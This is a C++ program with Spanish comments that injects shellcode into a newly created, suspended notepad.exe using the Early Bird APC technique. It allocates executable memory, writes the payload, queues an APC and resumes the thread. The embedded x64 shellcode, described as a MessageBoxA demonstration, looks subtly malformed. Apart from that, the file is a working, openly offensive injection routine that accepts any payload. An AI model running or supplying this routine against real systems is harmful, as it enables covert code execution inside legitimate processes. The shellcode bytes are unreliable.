#include <iostream>
#include <windows.h>
#include <string>

// Shellcode de MessageBoxA funcional para x64 (mensaje simple)
unsigned char shellcode[] = {
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x31, 0xC9, 0x48, 0x31, 0xD2, 0x49, 0xB8,
    0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x57, 0x69, 0x49, 0xBA, 0x6E, 0x64,
    0x6F, 0x77, 0x73, 0x21, 0x00, 0x00, 0x4D, 0x89, 0xD0, 0x48, 0xB9, 0x54,
    0x69, 0x74, 0x6C, 0x65, 0x00, 0x00, 0x00, 0x48, 0x31, 0xDB, 0x48, 0x83,
    0xEC, 0x20, 0xFF, 0x15, 0x0A, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x50,
    0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Función para obtener la dirección de MessageBoxA
void* GetMessageBoxAddress() {
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (hUser32 == NULL) {
        return NULL;
    }
    // Conversión explícita de FARPROC a void*
    return reinterpret_cast<void*>(GetProcAddress(hUser32, "MessageBoxA"));
}

// Función para parchear el shellcode con la dirección real de MessageBoxA
void PatchShellcode(void* pMessageBoxAddr) {
    // Copiar la dirección de MessageBoxA al final del shellcode
    memcpy(shellcode + sizeof(shellcode) - 8, &pMessageBoxAddr, sizeof(pMessageBoxAddr));
}

// Función para verificar si el proceso es de 64 bits
BOOL IsProcess64Bit(HANDLE hProcess) {
    BOOL bIsWow64 = FALSE;
    if (!IsWow64Process(hProcess, &bIsWow64)) {
        return FALSE;
    }
    return !bIsWow64; // Si no es Wow64, entonces es 64-bit
}

int main() {
    // Parchear el shellcode con la dirección real de MessageBoxA
    void* pMessageBoxAddr = GetMessageBoxAddress();
    if (pMessageBoxAddr == NULL) {
        std::cerr << "Error: No se pudo obtener la dirección de MessageBoxA" << std::endl;
        return 1;
    }
    PatchShellcode(pMessageBoxAddr);

    // --- 1. Crear el proceso víctima en estado suspendido ---
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // Usar notepad.exe de 64 bits (ajustar según sea necesario)
    wchar_t processPath[] = L"C:\\Windows\\System32\\notepad.exe";

    if (!CreateProcessW(NULL, processPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "Error: CreateProcessW falló. Código de error: " << GetLastError() << std::endl;
        return 1;
    }
    std::wcout << L"[*] Proceso '" << processPath << L"' creado en estado suspendido (PID: " << pi.dwProcessId << L")" << std::endl;

    // Verificar la arquitectura del proceso
    if (!IsProcess64Bit(pi.hProcess)) {
        std::cerr << "Error: El proceso objetivo no es de 64 bits, pero el shellcode sí lo es" << std::endl;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    // --- 2. Asignar memoria en el proceso víctima ---
    size_t shellcodeSize = sizeof(shellcode);
    LPVOID pRemoteBuffer = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteBuffer == NULL) {
        std::cerr << "Error: VirtualAllocEx falló. Código de error: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
    std::cout << "[*] Memoria asignada en el proceso remoto en la dirección: 0x" << std::hex << pRemoteBuffer << std::dec << std::endl;

    // --- 3. Escribir el shellcode en la memoria asignada ---
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, pRemoteBuffer, shellcode, shellcodeSize, &bytesWritten) || bytesWritten != shellcodeSize) {
        std::cerr << "Error: WriteProcessMemory falló. Código de error: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
    std::cout << "[*] Shellcode escrito exitosamente en el proceso remoto (" << bytesWritten << " bytes)." << std::endl;

    // --- 4. Poner en cola la APC en el hilo principal ---
    if (!QueueUserAPC((PAPCFUNC)pRemoteBuffer, pi.hThread, 0)) {
        std::cerr << "Error: QueueUserAPC falló. Código de error: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
    std::cout << "[*] APC apuntando a nuestro shellcode ha sido puesta en cola." << std::endl;

    // --- 5. Reanudar el hilo para que ejecute la APC ---
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        std::cerr << "Error: ResumeThread falló. Código de error: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
    std::cout << "[+] ¡Inyección exitosa! Hilo reanudado. La APC se ejecutará en breve." << std::endl;

    // Esperar un momento para que la APC se ejecute
    Sleep(2000);

    // --- 6. Limpieza ---
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}